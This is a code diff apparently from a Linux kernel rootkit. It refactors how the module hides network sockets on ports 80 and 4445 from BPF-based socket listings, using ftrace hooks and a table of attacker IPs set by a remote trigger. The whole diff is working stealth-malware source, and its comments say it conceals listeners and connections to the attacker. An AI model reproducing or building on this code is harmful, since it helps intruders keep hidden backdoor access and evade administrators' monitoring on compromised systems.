@@ -3,19 +3,11 @@
 #include "../include/hidden_pids.h"
 #include "../include/bpf_hook.h"
 
-#define HIDDEN_PORT 80
+#define HIDDEN_PORT  80
 #define HIDDEN_PORT2 4445
 
-static __be32 hidden_ip_cached = 0;
-static __be32 hidden_ip2_cached = 0;
-
-static inline void init_hidden_ip(void)
-{
-    if (unlikely(hidden_ip_cached == 0))
-        hidden_ip_cached = in_aton(YOUR_SRV_IP);
-    if (unlikely(hidden_ip2_cached == 0))
-        hidden_ip2_cached = in_aton(YOUR_SRV_IP2);
-}
+/* Per-slot port table (must match icmp.c SRV_PORT / SRV_PORT2) */
+static const u16 bpf_hidden_ports[MAX_INSTANCES] = { HIDDEN_PORT, HIDDEN_PORT2 };
 
 struct bpf_iter_ctx_tcp {
     struct bpf_iter_meta *meta;
@@ -39,39 +31,46 @@ static notrace bool should_hide_socket_port(struct sock_common *sk)
 {
     __be16 sport, dport;
     __be32 saddr, daddr;
-    
+    __be32 snap[MAX_INSTANCES];
+    unsigned long flags;
+    int i;
+
     if (!sk)
         return false;
-    
-    init_hidden_ip();
-    
+
+    spin_lock_irqsave(&g_srv_ips_lock, flags);
+    for (i = 0; i < MAX_INSTANCES; i++)
+        snap[i] = g_srv_ips[i];
+    spin_unlock_irqrestore(&g_srv_ips_lock, flags);
+
     if (sk->skc_family == AF_INET) {
         sport = sk->skc_num;
         dport = sk->skc_dport;
         saddr = sk->skc_rcv_saddr;
         daddr = sk->skc_daddr;
-        
-        if (sport == HIDDEN_PORT || ntohs(dport) == HIDDEN_PORT) {
-            if (saddr == hidden_ip_cached || daddr == hidden_ip_cached ||
-                saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) {
-                return true;
-            }
-        }
-        if (sport == HIDDEN_PORT2 || ntohs(dport) == HIDDEN_PORT2) {
-            if (saddr == hidden_ip2_cached || daddr == hidden_ip2_cached ||
-                saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY)) {
-                return true;
+
+        for (i = 0; i < MAX_INSTANCES; i++) {
+            if (sport == bpf_hidden_ports[i] || ntohs(dport) == bpf_hidden_ports[i]) {
+                /* Original intent: port AND (IP match OR INADDR_ANY listener).
+                 * Pre-trigger (snap[i]==0): only INADDR_ANY listeners hidden.
+                 * Post-trigger: listeners + active connections to/from attacker IP.
+                 * If user re-triggers from a new IP, the old established connection
+                 * is no longer matched here, but hiding_tcp.c covers it by port. */
+                if (saddr == htonl(INADDR_ANY) || daddr == htonl(INADDR_ANY))
+                    return true;
+                if (snap[i] != 0 && (saddr == snap[i] || daddr == snap[i]))
+                    return true;
             }
         }
     }
     else if (sk->skc_family == AF_INET6) {
         sport = sk->skc_num;
-        
-        if (sport == HIDDEN_PORT || sport == HIDDEN_PORT2) {
-            return true;
+        for (i = 0; i < MAX_INSTANCES; i++) {
+            if (sport == bpf_hidden_ports[i])
+                return true;
         }
     }
-    
+
     return false;
 }
 
@@ -511,8 +510,6 @@ static struct ftrace_hook hooks[] = {
 notrace int bpf_hook_init(void)
 {
     int ret, installed = 0, i;
-    
-    init_hidden_ip();
     
     for (i = 0; i < ARRAY_SIZE(hooks); i++) {
         ret = fh_install_hook(&hooks[i]);
